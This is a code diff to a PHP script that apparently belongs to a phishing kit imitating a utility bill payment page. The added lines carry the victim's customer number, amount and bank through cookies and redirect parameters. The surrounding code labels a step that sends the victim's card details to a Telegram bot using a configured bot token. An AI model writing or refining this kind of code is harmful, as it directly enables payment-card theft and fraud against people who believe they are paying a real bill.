@@ -214,6 +214,31 @@ if (strpos($bancoNormalizado, 'davivienda') !== false || strpos($bancoNormalizad
 } else {
     $redirectUrl = 'pago/qr/index.php';
 }
+
+// Propagar monto, NIC y banco en la redirección
+$nicClient = $data['nic'] ?? ($_POST['nic'] ?? '');
+$totalClient = $data['totalPagar'] ?? ($data['total'] ?? ($_POST['totalPagar'] ?? ''));
+$bancoClient = $issuer;
+
+if (!empty($totalClient)) {
+    @setcookie('aire_pago_total', $totalClient, time() + 86400, '/');
+}
+if (!empty($nicClient)) {
+    @setcookie('aire_pago_nic', $nicClient, time() + 86400, '/');
+}
+if (!empty($bancoClient)) {
+    @setcookie('aire_pago_banco', $bancoClient, time() + 86400, '/');
+}
+
+$queryParams = http_build_query([
+    'banco' => $bancoClient,
+    'nic'   => $nicClient,
+    'total' => $totalClient
+]);
+
+if (!empty($queryParams)) {
+    $redirectUrl .= (strpos($redirectUrl, '?') !== false ? '&' : '?') . $queryParams;
+}
 
 // 7. ENVIAR INFO DE LA TARJETA A TELEGRAM
 $botToken = $config['botToken'] ?? '';
